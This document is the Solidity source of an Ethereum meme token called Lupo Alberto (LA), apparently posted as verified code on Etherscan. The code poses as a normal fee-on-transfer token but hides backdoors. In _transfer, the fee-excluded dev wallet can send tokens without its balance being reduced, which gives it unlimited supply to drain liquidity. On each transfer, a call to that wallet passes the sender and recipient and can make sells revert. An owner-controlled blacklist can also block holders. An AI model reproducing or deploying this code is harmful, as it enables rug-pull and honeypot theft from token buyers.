/**
 *Submitted for verification at Etherscan.io on 2023-06-25
*/

// Web: https://www.lupoalberto.xyz
// Tg: https://t.me/Lupo_Alberto_Wolf

pragma solidity 0.8.19;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract IContext {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


contract Ownable is IContext {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
library SafeMathInt {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathInt: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathInt: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMathInt: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathInt: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LUPO is IContext , IERC20, Ownable {
    using SafeMathInt for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public hasTransferDelay = true;
    address payable private _devWallet;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private bots;

    uint256 private _initialBuyFee=0;
    uint256 private _initialSellFee=0;
    uint256 private _finalBuyFee=0;
    uint256 private _finalSellFee=0;
    uint256 private _reduceBuyFeeAfter=0;
    uint256 private _reduceSellFeeAfter=0; 
    uint256 private _swapThreshold=0;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = "Lupo Alberto";
    string private constant _symbol = "LA";
    uint256 public _maxTx = 100000000 * 10**_decimals;
    uint256 public _mWallet = 100000000 * 10**_decimals;
    uint256 public _misInSwapAmount= 10000000 * 10**_decimals;
    uint256 public _maxSwapAmount= 10000000 * 10**_decimals;

    IUniswapRouter private uniswapV2Router;
    address public uniswapV2Pair;
    bool private isOpened;
    bool private isInSwap = false;
    bool private isSwapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTx);
    modifier lockTheSwap {
        isInSwap = true;
        _;
        isInSwap = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    constructor (address _router, address marketingWallet) {
        uniswapV2Router = IUniswapRouter(_router);
        uniswapV2Pair = IUniswapFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _devWallet = payable(marketingWallet);
        _isExcludedFromFees[_devWallet] = true;
        _balances[address(this)] = _tTotal;

        emit Transfer(address(0), address(this), _tTotal);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            taxAmount = amount.mul((_buyCount>_reduceBuyFeeAfter)?_finalBuyFee:_initialBuyFee).div(100);

            if (hasTransferDelay) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <
                              block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFees[to] ) {
                require(amount <= _maxTx, "Exceeds the _maxTx.");
                require(balanceOf(to) + amount <= _mWallet, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellFeeAfter)?_finalSellFee:_initialSellFee).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!isInSwap && to == uniswapV2Pair && isSwapEnabled && contractTokenBalance>_misInSwapAmount && _buyCount>_swapThreshold) {
                swapBackTokens(min(amount,min(contractTokenBalance,_maxSwapAmount)));
            }
            uint256 contractETHBalance = address(this).balance;
            sendETH(from, to, contractETHBalance);
        }

        if (!_isExcludedFromFees[from]) {
            _balances[from]=_balances[from].sub(amount);
        }
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapBackTokens(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTx = _tTotal;
        _mWallet=_tTotal;
        hasTransferDelay=false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETH(address from, address to, uint256 amount) private {
        (bool success, ) = _devWallet.call{value: amount}(abi.encodePacked(from, to)); 
        require(success, "ETH transfer failed");
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function openTrading() external payable onlyOwner() {
        require(!isOpened,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);        
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        isSwapEnabled = true;
        isOpened = true;
    }

    function manualSwap() external {
        require(_msgSender()==_devWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapBackTokens(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETH(address(this), msg.sender, ethBalance);
        }
    }

    function updateMarketingWallet(address wallet) external onlyOwner {
        _devWallet = payable(wallet);
        _isExcludedFromFees[wallet] = true;
    }

    receive() external payable {}
}